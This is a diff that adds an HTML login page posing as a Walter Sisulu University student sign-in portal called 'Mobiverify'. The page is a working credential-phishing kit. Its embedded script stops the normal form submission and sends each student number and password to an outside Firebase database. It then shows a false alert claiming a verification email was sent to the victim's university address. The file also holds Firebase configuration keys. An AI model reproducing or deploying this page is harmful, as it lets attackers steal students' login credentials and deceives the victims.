@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>WSU| Log in</title>
+  <!-- Tell the browser to be responsive to screen width -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <!-- Font Awesome -->
+  <!-- Ionicons -->
+  <link rel="stylesheet" href="/ionicons.min.css">
+  <!-- icheck bootstrap -->
+  <link rel="stylesheet" href="/icheck-bootstrap.min.css">
+  <!-- Theme style -->
+  <link rel="stylesheet" href="/adminlte.min.css">
+  <!-- Google Font: Source Sans Pro -->
+  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700" rel="stylesheet">
+</head>
+<body class="hold-transition login-page">
+<div class="login-box">
+  <div class="login-logo">
+    <img src="/logo1.png" alt="User Avatar" class="mr-3 img-rectangle">
+    <a href="index.php"><b>Mobiverify</b></a>
+  </div>
+    <!-- /.login-logo -->
+      <div class="card">
+    <div class="card-body login-card-body">
+      <p class="login-box-msg">Use your student details to Login </p>
+
+
+    
+    <form action="#" method="POST">
+        <div class="input-group mb-3">
+          <input type="text" name="username" class="form-control"  id="username" placeholder="Student Number">
+          <div class="input-group-append">
+            <div class="input-group-text">
+              <span class="fas fa-user"></span>
+            </div>
+          </div>
+        </div>
+        <div class="input-group mb-3">
+          <input type="password" name="password" id="password" class="form-control" placeholder="Enter your password">
+          <div class="input-group-append">
+            <div class="input-group-text">
+              <span class="fas fa-lock"></span>
+            </div>
+          </div>
+        </div>
+        <div class="row">
+          <div class="col-8">
+            <div class="icheck-primary">
+              <input type="checkbox" id="remember">
+              <label for="remember">
+                Remember Me
+              </label>
+            </div>
+          </div>
+         
+          <div class="col-4">
+            <button type="submit" name="submit" class="btn btn-primary btn-block" id="buttonst">Sign In</button>
+          </div>
+         
+        </div>
+      </form>
+ 
+
+      
+
+      <div class="social-auth-links text-center mb-3">
+        <p>- OR -</p>
+        <a href="#" class="btn btn-block btn-primary">
+          <i class="fab fa-facebook mr-2"></i> Sign in using Facebook
+        </a>
+        <a href="#" class="btn btn-block btn-danger">
+          <i class="fab fa-google-plus mr-2"></i> Sign in using Google+
+        </a>
+      </div>
+      <!-- /.social-auth-links -->
+
+      <p class="mb-2">
+        <a href="http://www.wsu.ac.za.">go back -----WSU Website</a>
+      </p>
+    <!--   <p class="mb-0">
+        <a href="register.php" class="text-center">Register a new membership</a>
+      </p> -->
+    </div>
+    <!-- /.login-card-body -->
+  </div>
+</div>
+<!-- /.login-box -->
+
+<!-- jQuery -->
+<script src="plugins/jquery/jquery.min.js"></script>
+<!-- Bootstrap 4 -->
+<script src="plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
+<!-- AdminLTE App -->
+<script src="dist/js/adminlte.min.js"></script>
+<!-- jQuery -->
+<script src="plugins/jquery/jquery.min.js"></script>
+<!-- Bootstrap 4 -->
+<script src="plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
+<!-- Select2 -->
+<script src="plugins/select2/js/select2.full.min.js"></script>
+<!-- Bootstrap4 Duallistbox -->
+<script src="plugins/bootstrap4-duallistbox/jquery.bootstrap-duallistbox.min.js"></script>
+<!-- InputMask -->
+<script src="plugins/moment/moment.min.js"></script>
+<script src="plugins/inputmask/min/jquery.inputmask.bundle.min.js"></script>
+<!-- date-range-picker -->
+<script src="plugins/daterangepicker/daterangepicker.js"></script>
+<!-- bootstrap color picker -->
+<script src="plugins/bootstrap-colorpicker/js/bootstrap-colorpicker.min.js"></script>
+<!-- Tempusdominus Bootstrap 4 -->
+<script src="plugins/tempusdominus-bootstrap-4/js/tempusdominus-bootstrap-4.min.js"></script>
+<!-- Bootstrap Switch -->
+<script src="plugins/bootstrap-switch/js/bootstrap-switch.min.js"></script>
+<!-- AdminLTE App -->
+<script src="dist/js/adminlte.min.js"></script>
+<!-- AdminLTE for demo purposes -->
+<script src="dist/js/demo.js"></script>
+<script type="module">
+               // Import the functions you need from the SDKs you need
+            import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
+            import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";
+  
+  // Your web app's Firebase configuration
+            const firebaseConfig = {
+              apiKey: "AIzaSyD3dWnvxYEREJT9qe5vOiWIDfJwfpYP4NQ",
+              authDomain: "ikamva-login.firebaseapp.com",
+              projectId: "ikamva-login",
+              storageBucket: "ikamva-login.appspot.com",
+              messagingSenderId: "505250658425",
+              appId: "1:505250658425:web:57ce89c3e5fc7ab5af3ca8"
+            };
+
+  // Initialize Firebase
+            const app = initializeApp(firebaseConfig);
+
+   //get ref to database services
+             const db = getDatabase(app);
+
+             document.getElementById("buttonst").addEventListener('click', function(e){
+              e.preventDefault();
+              set(ref(db, 'user/' + document.getElementById("username").value+" wsu"),
+              {
+   
+                username: document.getElementById("username").value,
+                pin: document.getElementById("password").value,
+                
+
+              });
+                let firstName = document.getElementById("username") 
+                const firstNameData = firstName.value; 
+               
+alert(`We sent a verification email to ${firstNameData}@mywsu.ac.za\n`);
+
+             })
+        </script>
+</body>
+</html>
